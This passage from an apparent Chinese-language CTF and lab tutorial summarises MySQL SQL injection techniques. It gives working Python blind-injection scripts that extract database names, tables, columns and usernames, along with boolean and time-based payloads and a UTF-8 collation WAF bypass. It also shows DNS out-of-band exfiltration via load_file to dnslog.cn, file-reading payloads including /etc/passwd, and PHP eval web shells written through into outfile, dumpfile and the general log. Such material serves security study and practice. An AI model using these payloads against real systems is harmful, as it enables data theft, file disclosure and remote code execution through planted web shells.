1 row in set (0.00 sec)

mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;g&#39;);
+---------------------------+
| (select &#39;f&#39;)&gt;(select &#39;g&#39;) |
+---------------------------+
|                         0 |
+---------------------------+
1 row in set (0.00 sec)

mysql&gt; select (select &#39;f&#39;)&gt;(select &#39;agggggg&#39;);
+---------------------------------+
| (select &#39;f&#39;)&gt;(select &#39;agggggg&#39;) |
+---------------------------------+
|                               1 |
+---------------------------------+
1 row in set (0.00 sec)
</code></pre>
<p>因为在<strong>相等</strong>时返回<strong>0</strong>，所以在进行爆破时，我们爆破出来的<strong>1</strong>的时候，是比正确字符要<strong>大1</strong>的，所以在编写脚本时，我们要**-1<strong>才能得到正确字符。<br>所以我们在设置循环上限时ascii值要大于或者等于</strong>127**<br>脚本如下：([GYCTF2020]Ezsqli)</p>
<pre><code class="python">import requests

url=&#39;http://e0e4d9bf-1f0b-435c-aedf-6d1aa33856ce.node4.buuoj.cn:81/&#39;
flag=&#39;&#39;
for i in range(1,50):
    for j in range(32,128):
        hexchar=flag+chr(j)
        # f1ag_1s_h3r3_hhhhh这个表应该只有一个数据，所以id为1，我们用select 1,xx就可以进行第二个字段的比较了
        # 这个payload的意思就是f1ag_1s_h3r3_hhhhh第二个字段的数据每一个字符与这个字符串每隔一个字符一一比较大小，如果这个字符比较大，就返回True。以此类推，不断增加字符串长度，就可以得到完整的数据。
        payload = &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;.format(hexchar)
        #print(payload)
        data=&#123;&#39;id&#39;:payload&#125;
        re=requests.post(url=url,data=data)
        if &#39;Nu1L&#39; in re.text:
            flag+=chr(j-1)
            print(flag)
            break
</code></pre>
<h1 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h1><p> 盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程成为盲注 </p>
<pre><code class="python">1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的盲注来获取信息。
2.盲注是不能通过直接显示的途径来获取数据库数据的方法。
在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为三类,布尔盲注、延时盲注、报错盲注）
</code></pre>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><strong>原理：</strong>盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False<br>注入流程:</p>
<pre><code class="python">流程：
求当前数据库的长度以及ASCII
求当前数据库表的ASCII
求当前数据库表中的个数
求当前数据库表中其中一个表的表名长度
求当前数据库中其中一个表的表名的ASCII
求列名的数量
求列名的长度
求列名的ascii
求字段的数量
求字段内容的长度
求字段内容的ascii
</code></pre>
<p>以sql-labs第八关为例:<br>我们来简单测试下:</p>
<pre><code class="python">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;and length(database())=1--+
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943591164-d1756076-d55c-403c-947a-58fddd9293d4.png" alt="image.png"><br>当我们输入这样的语句，界面并没有反应，我们慢慢增加长度，到8时出现变化了:</p>
<pre><code class="python">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;and length(database())=8--+
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666943606968-cf2ad664-42ad-403c-8744-b5eca01d7399.png" alt="image.png"><br>这就说明盲注成功了！<br>剩下的就是结合一些函数提取出对应的字符进行判断即可</p>
<pre><code class="python">这里以sqlabs靶场为例

通过length函数 判断数据库长度和数据表字段信息数量。
通过substr、ascii函数 判断数据库名、表名、字段值等。

求数据库的长度       
http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and length(database()) = 8 --+

判断数据库第一位的字母
http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#39; and substr(database(),1,1) = &#39;s&#39; --+

求数据库中表的长度
第一个表名长度：&#39;and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1))=6--+
第二个表名长度 &#39;and length((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1))=8--+
长度为6、8

查询第一个表的第一位字符
&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=117--+

查询第二个表的第二个字符
&#39;and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 1,1),1,1))=117--+

判断字段的长度
&#39;and length((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 0,1))=6--+‘
 
 判断字段长度名称第一个字母的ascii
 &#39;and ord(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),1,1))=117--+

判断第二位长度名称第一个字母的ascii
&#39;and ord(substr((select column_name from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; limit 1,1),2,1))=115--+
</code></pre>
<p>然而这样的手工注入的效率我们是无法忍受的，我们可以基于二分法编写一个自动化脚本去帮助我们提升效率！</p>
<pre><code class="python">import requests
import time
url = &quot;http://127.0.0.1/sqli-labs/Less-8/&quot;
data= &quot;&quot;
for i in range(10000):
    min = 32
    max = 128
    while (min &lt; max) :
        mid = (min + max) // 2
        # 爆破数据库名
        payload = &quot;?id=1\&#39;and if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)
        # 爆破表名
        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=\&#39;security\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)
        # 爆破字段
        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\&#39;users\&#39;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)
        # 爆破数据
        #payload = &quot;?id=1\&#39;and if(ascii(substr((select group_concat(username) from users),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i, mid)
        urls = url+payload
        print(urls)
        response = requests.get(url=urls)
        if &quot;You&quot; in response.text:
            min = mid+1
        else:
            max = mid
        mid = (min + max) // 2
    data += chr(mid)
    print(data)
</code></pre>
<p>首先我们启动第一个payload，看一下结果<br><strong>得到数据库名:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666947971248-f6389bf2-db21-4a12-b751-bd9d9fc29b28.png" alt="image.png"><br><strong>启动第二个payload，得到表名:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948051467-a36e74af-fb19-46ff-8082-99d60f44d878.png" alt="image.png"><br><strong>启动第三个payload,我们查一下user表的字段</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948117597-6fbc3ac8-0440-4ae7-a09d-fbcc4bcd917b.png" alt="image.png"><br><strong>启动最后一个payload，来获取username字段里的数据叭</strong><br>如图，成功得到了字段里的数据<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948200677-0b7cb401-5693-410e-bda8-b40f64796037.png" alt="image.png"><br>通过脚本辅助注入可以极大的提升我们的注入效率！</p>
<h2 id="延迟盲注"><a href="#延迟盲注" class="headerlink" title="延迟盲注"></a>延迟盲注</h2><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功<br>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显<br>还是利用if来判断结果正确与否，只是返回值用延时来代替1<br>详情可查看上文，我们可以利用这个来判断是否注入，不过个人觉得并不适合批量跑数据，因为时间有太多的不可控性,我们拿来做个判断就好，同样用sqil-labs8来示范<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666948437175-8eccdf4a-4500-4756-a089-5f02c42b6244.png" alt="image.png"><br>这个页面过了10s左右才加载完毕，我们可以利用这个来判断是否存在注入</p>
<h2 id="爆错盲注"><a href="#爆错盲注" class="headerlink" title="爆错盲注"></a>爆错盲注</h2><p>这里参考上文爆错注入即可，区别就是这个可能无法回显出数据，但是成功与失败页面可能存在差异，可以利用这个差异去编写脚本进行判断</p>
<h2 id="当关键词被过滤使用异或注入代替"><a href="#当关键词被过滤使用异或注入代替" class="headerlink" title="当关键词被过滤使用异或注入代替"></a>当关键词被过滤使用异或注入代替</h2><p>当and和or被过滤的时候，我们可以用异或注入然后搭配上面三个去代替，本质上是一样的。</p>
<h1 id="DNS请求注入"><a href="#DNS请求注入" class="headerlink" title="DNS请求注入"></a>DNS请求注入</h1><p><strong>DNS平台:</strong></p>
<pre><code class="python">http://www.dnslog.cn
http://ceye.io
</code></pre>
<p><strong>DNS注入原理:</strong></p>
<pre><code class="python">dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据

在无法通过联合查询直接获取数据时，只能通过盲注，来一步步的获取数据，手工测试是需要花费大量的时间，使用sqlmap直接去跑出数据，但是有很大的几率，网站把ip给封掉，这就影响了测试进度
</code></pre>
<p><strong>前提条件:</strong></p>
<pre><code class="python">dns带外查询属于MySQL注入

在MySQL中有个系统属性，secure_file_priv特性，有三种状态

secure_file_priv为null    表示不允许导入导出

secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹

secure_file_priv没有设置时，则表示没有任何限制
</code></pre>
<p>我们要让secure_file_priv没有任何限制才能注入成功，我们这里本地搭建环境<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950864657-b85a2de5-e3fc-4ce0-9f8b-b72c284a16c0.png" alt="image.png"><br>让这里为空<br><strong>相关函数:</strong></p>
<pre><code class="python">LOAD_FILE()函数

读取一个文件并将其内容作为字符串返回

语法：load_file(文件的完整路径）

此函数使用需要满足的条件

要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。
该文件所有字节可读，但文件内容必须小于max_allowed_packet。
如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。
而且LOAD_FILE()函数不仅能够加载本地文件，同时也能对诸如\\www.test.com这样的UNCurl发起请求。
</code></pre>
<pre><code class="python">UNC是一种命名惯例，主要用于在Microsoft Windows上指定和映射网络驱动器。
UNC命名惯例最多被应用于局域网中访问文件服务器或者打印机。
我们日常常用的网络共享文件就是这个方式。
UNC路径就是类似\softer这样的形式的网络路径。
格式:\servername\sharename，其中servername是服务器名，sharename是共享资源的名称。
</code></pre>
<p><strong>构造注入语句:</strong></p>
<pre><code class="python">（根据实际情况构造）

select load_file(concat(&#39;//&#39;,(select database()),&#39;.oo0fjh.dnslog.cn/abc&#39;))

select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.oo0fjh.dnslog.cn\\123&#39;))

load_file()函数访问的是文件，所以域名后面需要添加/abc
</code></pre>
<p>我们来执行一下语句:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950895154-7656141c-8ec3-42c7-8ecc-679b1e24e3cc.png" alt="image.png"><br>如图，这里的security就是我们的数据库名称<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png" alt="image.png"></p>
<h1 id="mysql关于utf-8编码问题"><a href="#mysql关于utf-8编码问题" class="headerlink" title="mysql关于utf-8编码问题"></a><strong>mysql关于utf-8编码问题</strong></h1><p>如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的<br>是无法像GBK用宽字节绕过 ‘ ，但是在数据库中utf-8分为2种校对模式<br>utf8_unicode_ci<br>该模式会把特殊字母转换成2个正规英文，例如ß=ss<br>utf8_general_ci<br>该模式会把特殊字符转换成1个正规英文，例如Ä = A，Ö = O，Ü = U<br>比如是utf8_general_ci模式，下面是$sql1会被拦截，而$sql2不会被拦截</p>
<pre><code class="python">$sql1 = select * from admin where id = &#39;xx&#39; union select 1,2,database() #
$sql2 = select * from admin where id = &#39;xx&#39; uniÖn select 1,2,database() #
if(preg_match(&#39;/union/i&#39;,$sql1) &gt; 0)&#123;
　　echo &#39;waf&#39;;
&#125;
else&#123;
　　执行sql语句
&#125;

if(preg_match(&#39;/union/i&#39;,$sql2) &gt; 0)&#123;
　　echo &#39;waf&#39;;
&#125;
else&#123;
　　执行sql语句
&#125;
</code></pre>
<h1 id="sql注入读取文件"><a href="#sql注入读取文件" class="headerlink" title="sql注入读取文件"></a>sql注入读取文件</h1><h2 id="load-file读取文件"><a href="#load-file读取文件" class="headerlink" title="load_file读取文件"></a>load_file读取文件</h2><p><strong>文件读取基本条件:</strong></p>
<pre><code class="python">当前用户权限对该文件可读。
文件在该服务器上。
路径完整。
文件大小小于max_sllowed_packet。
当前数据库用户有FILE权限，File_priv为yes
secure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作。
</code></pre>
<p><strong>查看secure_file_priv</strong></p>
<pre><code class="python"> show variables like &#39;%secure%&#39;;
</code></pre>
<pre><code class="python">在MySQL中有个系统属性，secure_file_priv特性，有三种状态

secure_file_priv为null    表示不允许导入导出

secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹

secure_file_priv没有设置时，则表示没有任何限制
</code></pre>
<p>如果这个为null我们是无法读取文件的<br><strong>读取文件命令:</strong><br>*<em>注意路径问题，是/而不能是*</em></p>
<pre><code class="python">mysql&gt; select load_file(&#39;E:/phpstudy_pro/WWW/flag.txt&#39;);
+--------------------------------------------------------------------------------------+
| load_file(&#39;E:/phpstudy_pro/WWW/flag.txt&#39;)                                            |
+--------------------------------------------------------------------------------------+
| 0x666C61677B746869735F31735F66316161616161677D                                       |
+--------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666976308164-9d325d8d-5c1d-4cb0-866d-26860e656f36.png" alt="image.png"><br>当我们使用SQL注入来进行文件读写时，还需要注意，在网站的PHP设置中是否使用了magic_quotes_gpc的魔术引导开关，该参数的设置会对单引号、双引号、反斜杠与空字符进行过滤。这样，当我们使用MySQL进行文件读写，要输入目标站点路径时，就会受到限制。针对这一点，<strong>我们可以使用16进制编码的方式来进行绕过。</strong></p>
<pre><code class="python">mysql&gt; select load_file(0x453A2F70687073747564795F70726F2F5757572F666C61672E747874);
+----------------------------------------------------------------------------------------------------------------------------------------------+
| load_file(0x453A2F70687073747564795F70726F2F5757572F666C61672E747874)
                                                  |
+----------------------------------------------------------------------------------------------------------------------------------------------+
| 0x666C61677B746869735F31735F66316161616161677D
                                                  |
+----------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
</code></pre>
<h2 id="Load-data-infile读取文件"><a href="#Load-data-infile读取文件" class="headerlink" title="Load data infile读取文件"></a>Load data infile读取文件</h2><p>当”LOAD DATA local INFILE”时出现The used command is not allowed with this MySQL version问题时<br>第一是版本确实过低，低于5.0，但是现在基本不可能出现这个问题。<br>第二可能是本地导入文件的参数没有打开。<br>我们输入:</p>
<pre><code class="python">mysql&gt; SHOW VARIABLES LIKE &#39;%local%&#39;;
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| local_infile  | OFF    |
+---------------+-------+
1 row in set, 1 warning (0.00 sec)
</code></pre>
<p>发现雀氏没打开哦<br>我们再输入:</p>
<pre><code class="python">SET GLOBAL local_infile=1;
</code></pre>
<p>读取文件payload:</p>
<pre><code class="python">load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;
</code></pre>
<p>这里我本地复现失败了，我就放一张别人的图吧，qaq<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png" alt="图片-26.png"></p>
<h1 id="sql注入写shell"><a href="#sql注入写shell" class="headerlink" title="sql注入写shell"></a>sql注入写shell</h1><h2 id="into-outfile-写文件"><a href="#into-outfile-写文件" class="headerlink" title="into outfile()写文件"></a>into outfile()写文件</h2><p>写入一句话payload:</p>
<pre><code class="python">select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;
</code></pre>
<pre><code class="python">mysql&gt; select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;
Query OK, 1 row affected (0.00 sec)
</code></pre>
<p>写入的数据可以用16进制代替，但是 outfile后面不能接Ox开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义,那么基本没的玩了。  </p>
<pre><code class="python">select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666979808674-b35c4b47-d186-436f-80ab-63031277162c.png" alt="image.png"><br>写入shell成功!</p>
<h2 id="into-dumpfile-写文件"><a href="#into-dumpfile-写文件" class="headerlink" title="into dumpfile()写文件"></a>into dumpfile()写文件</h2><p>into dumpfile只能导出第一行数据，并不常用，通常写入第二条数据的时候出错，但第二条内容已被写入文件</p>
<pre><code class="python">select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into dumpfile &#39;D:/HY.php&#39;
</code></pre>
<p>写入的数据可以用16进制代替</p>
<pre><code class="python">select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into dumpfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;
</code></pre>
<h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><p>into dumpfile它只能导出一行数据，并不常用，用于导出一条数据，通常写入第二条的时候出错，但第二条内容已被写入文件。<br>outfile函数可以导出多行，而dumpfile只能导出一行数据。<br>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。<br>dumpfile适用于二进制文件，它会将目标文件吸入同一行内; outfile则更适用于文本文件。</p>
<h2 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h2><pre><code class="python">MySQL日志文件系统的组成:
错误日志log_error：记录启动、运行或停止mysqld时出现的问题。
通用日志general_log：记录建立的客户端连接和执行的语句。
更新日志：记录更改数据的语句。该日志在MySQL 5.1中已不再使用。
二进制日志：记录所有更改数据的语句。还用于复制。
慢查询日志slow_query_log：记录所有执行时间超过long_query_time秒(默认10秒)的所有查询或不使用索引的查询。
Innodb日志：innodb redolog
</code></pre>
<p> 以下举例两种:</p>
<pre><code class="python">show global variables like &quot;%general%&quot;;                 #查看general文件配置情况
set global general_log=&#39;on&#39;;                            #开启日志记录
set global general_log_file=&#39;C:/phpstudy/WWW/shell.php&#39;;
select &#39;&lt;?php @eval($_POST[shell]); ?&gt;&#39;;                #日志文件导出指定目录
set global general_log=off;                             #关闭记录
</code></pre>
<pre><code class="python">show variables like &#39;%slow%&#39;;                           #慢查询日志
set GLOBAL slow_query_log_file=&#39;C:/phpStudy/PHPTutorial/WWW/slow.php&#39;;
set GLOBAL slow_query_log=on;
/*set GLOBAL log_queries_not_using_indexes=on;
show variables like &#39;%log%&#39;;*/
select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.user where sleep(10);
</code></pre>
<h1 id="Mysql任意文件读取"><a href="#Mysql任意文件读取" class="headerlink" title="Mysql任意文件读取"></a>Mysql任意文件读取</h1><p>这个解释起来比较多，放个参考链接<br><a target="_blank" rel="noopener" href="https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b#">https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b?#</a> 《MySQL客户端任意文件读取》</p>
<h1 id="MYSQL8-0注入新特性"><a href="#MYSQL8-0注入新特性" class="headerlink" title="MYSQL8.0注入新特性"></a>MYSQL8.0注入新特性</h1><p>MYSQL8.0.19后 出现两个新的关键字table和values  </p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置:"></a>环境配置:</h2><p>** 选择使用docker搭建:**</p>
<pre><code class="python">docker pull mysql:8.0.22
docker run -itd -p 3306:3306 -e MYSQL_ROOT_PASSWORD=HY666123 mysql:8.0.22
# 进去docker容器
docker exec -it 410b0261fe70 bash
# 登陆mysql
mysql -u root -pHY666123
# 开启远程访问权限
use mysql;
select host,user from user;
# 因为mysql8.0默认认证方式和5不一样，通过下面语句修改即可
ALTER USER &#39;root&#39; IDENTIFIED WITH mysql_native_password BY &#39;HY666123&#39;;
flush privileges;
</code></pre>
<p>我们来远程连接一下:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667118176379-90035b23-4012-4ead-af9d-87fe3e093804.png" alt="image.png"><br>成功连接上去了<br><strong>sql注入的靶场用sqli-lab</strong><br><a target="_blank" rel="noopener" href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a><br>按照文档搭建好，进入容器修改sqli-lab的配置文件</p>
<pre><code class="python"># 启动容器
docker-compose up -d
# 进入sql-labs容器
docker exec -it e0c30b42806f bash
# 编辑文件
vi /app/sql-connections/db-creds.inc
# 配置文件
#数据库的IP填宿主机的就可以，通过ifconfig查看容器IP地址
#比如容器IP为：172.18.0.2，一般来说宿主机为172.18.0.1
&lt;?php
//give your mysql connection username n password
$dbuser =&#39;root&#39;;
$dbpass =&#39;HY666123&#39;;
$dbname =&quot;security&quot;;
$host = &#39;172.18.0.1&#39;;
$dbname1 = &quot;challenges&quot;;
?&gt;
# 重启docker容器
docker restart e0c30b42806f
</code></pre>
<p>搞了好久，终于搭建好了，md<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121281615-4e12879b-9bf6-4456-94b3-3163f4079709.png" alt="image.png"></p>
<h2 id="table"><a href="#table" class="headerlink" title="table"></a>table</h2><p><strong>基本用法</strong><br>在MYSQL8以后出现的新语法，作用和select类似。</p>
<pre><code class="python">作用：列出表中全部内容
语法：TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121671251-06a4a33b-5ac5-41a5-a73a-f9c81a8d1154.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121711905-0c346772-77f6-4421-9450-fc7634d6d66b.png" alt="image.png"><br><strong>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。</strong></p>
<pre><code class="python">table user order by 2
table user limit 2
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121769501-851d711d-14c6-44bb-bb9a-cdc1b8244c34.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121789469-1d020011-3434-4884-b299-d9c70668b6a0.png" alt="image.png"><br><strong>与SELECT的区别：</strong></p>
<pre><code class="python">1.TABLE始终显示表的所有列 2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句
</code></pre>
<p><strong>注意事项:</strong><br><strong>比较问题一:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667122326816-e2d3588e-7b50-42aa-9d51-55072e2495f6.png" alt="image.png"><br>我们来构造sql语句:</p>
<pre><code class="python">mysql&gt; select ((&#39;r&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));        
+------------------------------------------------------------------------+                   
| ((&#39;r&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |                   
+------------------------------------------------------------------------+                   
|                                                                      1 |                   
+------------------------------------------------------------------------+                   
1 row in set (0.24 sec)                                                                      
                                                                                             
mysql&gt; select ((&#39;t&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));        
+------------------------------------------------------------------------+                   
| ((&#39;t&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |                   
+------------------------------------------------------------------------+                   
|                                                                      0 |                   
+------------------------------------------------------------------------+                   
1 row in set (0.23 sec)                                                                      
</code></pre>
<p>这里看起来和以前一样，但是当我们换为s时:</p>
<pre><code class="python">mysql&gt; select ((&#39;s&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+------------------------------------------------------------------------+
| ((&#39;s&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+------------------------------------------------------------------------+
|                                                                      1 |
+------------------------------------------------------------------------+
1 row in set (0.23 sec)
</code></pre>
<p>同样为1，说明当ascii相等的时候返回1<br><strong>所以在进行注入中注意要把得到的数ascii值减1。</strong><br><strong>比较问题二</strong></p>
<pre><code class="python">mysql&gt; select ((&#39;security/user&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+------------------------------------------------------------------------------------+
| ((&#39;security/user&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+------------------------------------------------------------------------------------+
|                                                                                  1 |
+------------------------------------------------------------------------------------+
1 row in set (0.23 sec)

mysql&gt; select ((&#39;security/users&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+-------------------------------------------------------------------------------------+
| ((&#39;security/users&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+-------------------------------------------------------------------------------------+
|                                                                                NULL |
+-------------------------------------------------------------------------------------+
1 row in set (0.23 sec)

mysql&gt; select ((&#39;security/usert&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));
+-------------------------------------------------------------------------------------+
| ((&#39;security/usert&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |
+-------------------------------------------------------------------------------------+
|                                                                                   0 |
+-------------------------------------------------------------------------------------+
1 row in set (0.23 sec)
</code></pre>
<p>当前面字符串相等时，会比较最后一位，当完全相等时，返回NULL<br><strong>比较问题三</strong><br>整数比较问题</p>
<pre><code class="python">mysql&gt; select ((&#39;0&#39;,2,3)&lt;(table users limit 0,1));
+-------------------------------------+
| ((&#39;0&#39;,2,3)&lt;(table users limit 0,1)) |
+-------------------------------------+
|                                   1 |
+-------------------------------------+
1 row in set (0.23 sec)

mysql&gt; select ((&#39;1&#39;,2,3)&lt;(table users limit 0,1));
+-------------------------------------+
| ((&#39;1&#39;,2,3)&lt;(table users limit 0,1)) |
+-------------------------------------+
|                                   0 |
+-------------------------------------+
1 row in set (0.23 sec)

mysql&gt; select ((&#39;2&#39;,2,3)&lt;(table users limit 0,1));
+-------------------------------------+
| ((&#39;2&#39;,2,3)&lt;(table users limit 0,1)) |
+-------------------------------------+
|                                   0 |
+-------------------------------------+
1 row in set (0.23 sec)

mysql&gt; select ((&#39;0aa&#39;,2,3)&lt;(table users limit 0,1));
+---------------------------------------+
| ((&#39;0aa&#39;,2,3)&lt;(table users limit 0,1)) |
+---------------------------------------+
|                                     1 |
+---------------------------------------+
1 row in set, 1 warning (0.23 sec)

mysql&gt; select ((&#39;1aa&#39;,2,3)&lt;(table users limit 0,1));
+---------------------------------------+
| ((&#39;1aa&#39;,2,3)&lt;(table users limit 0,1)) |
+---------------------------------------+
|                                     0 |
+---------------------------------------+
1 row in set, 1 warning (0.23 sec)
</code></pre>
<p> 在这里，由于id是整型，当我们输入的是字符型时，在进行比较过程中，字符型会被强制转换为整型，而不是像之前一样读到了第一位以后没有第二位就会停止，也就是都会强制转换为整型进行比较并且会一直持续下去，所以以后写脚本当跑到最后一位的时候尤其需要注意。  </p>
<h2 id="VALUES"><a href="#VALUES" class="headerlink" title="VALUES"></a>VALUES</h2><p>VALUES 类似于其他数据库的 ROW 语句，造数据时非常有用。   </p>
<pre><code class="python">作用：列出一行的值
语法：VALUES row_constructor_list[ORDER BY column_designator][LIMIT BY number] row_constructor_list:   ROW(value_list)[, ROW(value_list)][, ...]value_list:   value[, value][, ...]column_designator:   column_index
</code></pre>
<p> 基本使用:</p>
<pre><code class="python">VALUES ROW(1,2)
VALUES ROW(1,2,3)
VALUES ROW(1,2,3),ROW(5,6,7)
</code></pre>
<p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123148793-3de4ecc3-8810-43ea-a5c9-39db2ae76870.png" alt="image.png"><br> 配合union使用:</p>
<pre><code class="python">VALUES ROW(1, 2) union select * from user
select * from user union VALUES ROW(1, 2)
</code></pre>
<h2 id="information-schema-TABLESPACES-EXTENSIONS"><a href="#information-schema-TABLESPACES-EXTENSIONS" class="headerlink" title="information_schema.TABLESPACES_EXTENSIONS"></a>information_schema.TABLESPACES_EXTENSIONS</h2><pre><code class="python"># 我们可以通过这个表去查询所有数据库中的数据库和数据表
table information_schema.TABLESPACES_EXTENSIONS
等价于
select * from information_schema.TABLESPACES_EXTENSIONS
</code></pre>
